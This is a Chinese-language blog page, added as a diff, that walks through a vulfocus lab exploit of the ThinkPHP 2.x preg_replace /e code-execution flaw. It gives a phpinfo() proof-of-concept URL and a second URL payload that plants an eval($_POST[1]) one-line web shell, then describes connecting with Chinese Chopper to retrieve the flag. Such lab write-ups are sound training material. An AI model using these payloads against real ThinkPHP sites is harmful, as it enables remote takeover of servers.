@@ -1,0 +1,188 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>vulfocus解题漏洞报告-ThinkPHP 2.X 任意代码执行 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="thinkphp-2x-rce 代码执行漏洞解释ThinkPHP 2.x版本中，使用preg_replace的&amp;#x2F;e模式匹配路由：$res &amp;#x3D; preg_replace(‘@(\w,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="vulfocus解题漏洞报告-ThinkPHP 2.X 任意代码执行 - Hexo"/>
+    <meta name="twitter:description" content="thinkphp-2x-rce 代码执行漏洞解释ThinkPHP 2.x版本中，使用preg_replace的&amp;#x2F;e模式匹配路由：$res &amp;#x3D; preg_replace(‘@(\w,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Hexo"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="vulfocus解题漏洞报告-ThinkPHP 2.X 任意代码执行 - Hexo"/>
+    <meta property="og:description" content="thinkphp-2x-rce 代码执行漏洞解释ThinkPHP 2.x版本中，使用preg_replace的&amp;#x2F;e模式匹配路由：$res &amp;#x3D; preg_replace(‘@(\w,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">vulfocus解题漏洞报告-ThinkPHP 2.X 任意代码执行</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">vulfocus解题漏洞报告-ThinkPHP 2.X 任意代码执行</h1>
+        <div class="stuff">
+            <span>三月 14, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="thinkphp-2x-rce-代码执行"><a href="#thinkphp-2x-rce-代码执行" class="headerlink" title="thinkphp-2x-rce 代码执行"></a>thinkphp-2x-rce 代码执行</h1><h2 id="漏洞解释"><a href="#漏洞解释" class="headerlink" title="漏洞解释"></a>漏洞解释</h2><p>ThinkPHP 2.x版本中，使用preg_replace的&#x2F;e模式匹配路由：<br>$res &#x3D; preg_replace(‘@(\w+)’.$depr.’([^’.$depr.’/]+)@e’, ‘$var[&#39;\1&#39;]&#x3D;”\2”;’, implode($depr,$paths));<br>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。<br>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://zhishihezi.net/endpoint/textarea/a556f156c8e19ad7ab6a35b7f5748949?event=436b34f44b9f95fd3aa8667f1ad451b12147ec3b361538ec1c3a9fbe3a8c6c7a8f151536815af5fe39a12e3786505a3ebac7eececbb80b8740d49a6dd0107eac2ae35fd23afe96d2d7a9a08caf9f2769ba2f0709a87ee977989730c5eecf424faa7911f7f0555151410026072cda701096448219311e3b3fea5ce26f4ca2d6c14e99131a9b9395922263b3be38fbf06b0aa8c8b5499bec8226da84957556d22056e17c14b9ea38a341dd49cda2b7e54075e5691cade922fdc2db68b15e8526ae537fc269c141e336e35aeada474f9ba3b0cd22a8295a909acdca616120c6ad5ff7f53d69eeee712e70104edc4fa02d0ee017bbc9233b3e67624d576659dad5f3#0">https://zhishihezi.net/endpoint/textarea/a556f156c8e19ad7ab6a35b7f5748949?event=436b34f44b9f95fd3aa8667f1ad451b12147ec3b361538ec1c3a9fbe3a8c6c7a8f151536815af5fe39a12e3786505a3ebac7eececbb80b8740d49a6dd0107eac2ae35fd23afe96d2d7a9a08caf9f2769ba2f0709a87ee977989730c5eecf424faa7911f7f0555151410026072cda701096448219311e3b3fea5ce26f4ca2d6c14e99131a9b9395922263b3be38fbf06b0aa8c8b5499bec8226da84957556d22056e17c14b9ea38a341dd49cda2b7e54075e5691cade922fdc2db68b15e8526ae537fc269c141e336e35aeada474f9ba3b0cd22a8295a909acdca616120c6ad5ff7f53d69eeee712e70104edc4fa02d0ee017bbc9233b3e67624d576659dad5f3#0</a></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h4 id="打开靶场"><a href="#打开靶场" class="headerlink" title="打开靶场"></a>打开靶场</h4><p><img src="https://i.loli.net/2021/10/25/8QWMSh6KnjiCq9b.png" alt="20211025202127"></p>
+<h4 id="利用-POC-来验证-phpinfo-成功执行。在地址栏添加POC"><a href="#利用-POC-来验证-phpinfo-成功执行。在地址栏添加POC" class="headerlink" title="利用 POC 来验证, phpinfo() 成功执行。在地址栏添加POC"></a>利用 POC 来验证, phpinfo() 成功执行。在地址栏添加POC</h4><p><code>/index.php?s=/index/index/xxx/$&#123;@phpinfo()&#125;</code></p>
+<h4 id="成功执行"><a href="#成功执行" class="headerlink" title="成功执行"></a>成功执行</h4><p><img src="https://i.loli.net/2021/10/25/Jr9xiG6SjpPFyCO.png" alt="20211025202323"></p>
+<h4 id="写入一句话木马，用新的POC替换进地址栏"><a href="#写入一句话木马，用新的POC替换进地址栏" class="headerlink" title="写入一句话木马，用新的POC替换进地址栏"></a>写入一句话木马，用新的POC替换进地址栏</h4><p><code>/index.php?s=/index/index/xxx/$&#123;$&#123;@eval($_POST[1])&#125;&#125;</code><br><img src="https://i.loli.net/2021/10/25/WVvDAoBgSIdEXk6.png" alt="20211025202526"></p>
+<h4 id="或用burp抓包改包"><a href="#或用burp抓包改包" class="headerlink" title="或用burp抓包改包"></a>或用burp抓包改包</h4><p><img src="https://i.loli.net/2021/10/25/GAWZz6QrwE3PoUd.png" alt="20211025225442"></p>
+<h4 id="用菜刀连接（这里不知道为什么用冰蝎是连不上的）"><a href="#用菜刀连接（这里不知道为什么用冰蝎是连不上的）" class="headerlink" title="用菜刀连接（这里不知道为什么用冰蝎是连不上的）"></a>用菜刀连接（这里不知道为什么用冰蝎是连不上的）</h4><h4 id="密码填1，因为POST里面是1。"><a href="#密码填1，因为POST里面是1。" class="headerlink" title="密码填1，因为POST里面是1。"></a>密码填1，因为POST里面是1。</h4><p><img src="https://i.loli.net/2021/10/27/XEsvxLOu362I1ml.png" alt="20211027175324"></p>
+<h4 id="找到tmp文件夹"><a href="#找到tmp文件夹" class="headerlink" title="找到tmp文件夹"></a>找到tmp文件夹</h4><p><img src="https://i.loli.net/2021/10/27/NYPkuhbHy3r1BGi.png" alt="20211027180059"></p>
+<h4 id="成功获取flag"><a href="#成功获取flag" class="headerlink" title="成功获取flag"></a>成功获取flag</h4>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHNkazB1a3lqNl9kMl82P2U9aDgxYUZQ.wav"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHhtbVE0d01TYUZqQ2w4P2U9MGpOaFVZ.wav"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#thinkphp-2x-rce-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">thinkphp-2x-rce 代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%87%8A"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞解释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.2.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E9%9D%B6%E5%9C%BA"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">打开靶场</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-POC-%E6%9D%A5%E9%AA%8C%E8%AF%81-phpinfo-%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E3%80%82%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E6%B7%BB%E5%8A%A0POC"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">利用 POC 来验证, phpinfo() 成功执行。在地址栏添加POC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">成功执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8C%E7%94%A8%E6%96%B0%E7%9A%84POC%E6%9B%BF%E6%8D%A2%E8%BF%9B%E5%9C%B0%E5%9D%80%E6%A0%8F"><span class="toc-number">1.3.0.4.</span> <span class="toc-text">写入一句话木马，用新的POC替换进地址栏</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%96%E7%94%A8burp%E6%8A%93%E5%8C%85%E6%94%B9%E5%8C%85"><span class="toc-number">1.3.0.5.</span> <span class="toc-text">或用burp抓包改包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5%EF%BC%88%E8%BF%99%E9%87%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8%E5%86%B0%E8%9D%8E%E6%98%AF%E8%BF%9E%E4%B8%8D%E4%B8%8A%E7%9A%84%EF%BC%89"><span class="toc-number">1.3.0.6.</span> <span class="toc-text">用菜刀连接（这里不知道为什么用冰蝎是连不上的）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%A1%AB1%EF%BC%8C%E5%9B%A0%E4%B8%BAPOST%E9%87%8C%E9%9D%A2%E6%98%AF1%E3%80%82"><span class="toc-number">1.3.0.7.</span> <span class="toc-text">密码填1，因为POST里面是1。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%88%B0tmp%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">1.3.0.8.</span> <span class="toc-text">找到tmp文件夹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96flag"><span class="toc-number">1.3.0.9.</span> <span class="toc-text">成功获取flag</span></a></li></ol></li></ol></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
